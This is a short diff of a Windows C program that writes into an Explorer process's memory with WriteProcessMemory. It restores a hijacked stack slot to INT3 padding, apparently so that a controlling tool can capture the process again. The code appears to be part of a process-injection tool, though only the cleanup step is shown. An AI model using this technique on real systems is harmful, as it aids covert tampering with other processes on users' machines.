@@ -150,20 +150,22 @@ int main(int argc, const char* argv[])
 		header[0],
 		header[1]);
 
-	const BYTE zero[8] = { 0 };
+	// Restore the slot to its original INT3 padding (not zeros) so the
+	// controller's next capture pre-check accepts this Explorer process again.
+	const BYTE padding[8] = { 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC };
 	SIZE_T written = 0;
-	if (!WriteProcessMemory(explorer, (LPVOID)slot, zero, sizeof(zero), &written) || written != sizeof(zero))
+	if (!WriteProcessMemory(explorer, (LPVOID)slot, padding, sizeof(padding), &written) || written != sizeof(padding))
 	{
-		fprintf(stderr, "[-] RSP slot cleanup write: E%lu\n", GetLastError());
+		fprintf(stderr, "[-] RSP slot restoration write: E%lu\n", GetLastError());
 		goto _FINAL;
 	}
-	UINT_PTR cleared = 0;
-	if (!ReadRemote(explorer, slot, &cleared, sizeof(cleared)) || cleared)
+	UINT_PTR restored = 0;
+	if (!ReadRemote(explorer, slot, &restored, sizeof(restored)) || restored != 0xCCCCCCCCCCCCCCCCULL)
 	{
-		fprintf(stderr, "[-] RSP slot cleanup verification failed\n");
+		fprintf(stderr, "[-] RSP slot restoration verification failed\n");
 		goto _FINAL;
 	}
-	printf("[+] RSP slot cleared and verified\n");
+	printf("[+] RSP slot restored to INT3 padding and verified\n");
 
 	result = EXIT_SUCCESS;
 
